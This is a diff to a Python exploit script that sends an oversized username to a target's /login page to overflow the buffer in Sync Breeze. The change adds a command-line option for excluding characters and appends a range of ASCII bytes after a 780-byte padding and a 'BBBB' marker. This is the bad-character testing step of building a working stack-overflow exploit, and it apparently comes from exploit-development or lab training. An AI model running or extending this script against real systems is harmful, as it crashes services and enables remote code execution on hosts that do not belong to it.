@@ -8,6 +8,7 @@ import argparse
 # Script arguments
 parser = argparse.ArgumentParser(description='Sync breeze buffer overflow')
 parser.add_argument('host', help='host to target')
+parser.add_argument('exclude', help='id of ascii characters to exclude', nargs='*', type=int)
 args = parser.parse_args()
 
 url = f"http://{args.host}/login"
@@ -24,7 +25,9 @@ headers = {
 
 print(f"starting overflow on {url}")
 
-username = 'A' * 780 + 'DOPE' + 'C' * 16
+username = 'A' * 780 + 'BBBB' + 'C' * 16
+# Get ascii characters, excluding the ones know to be bad
+username += ''.join(chr(i) for i in range(128) if i not in args.exclude)
 
 data = {
     "username": username,
@@ -35,3 +38,5 @@ try:
     print("received response, overflow failed")
 except requests.exceptions.ReadTimeout:
     print("request timed out")
+
+
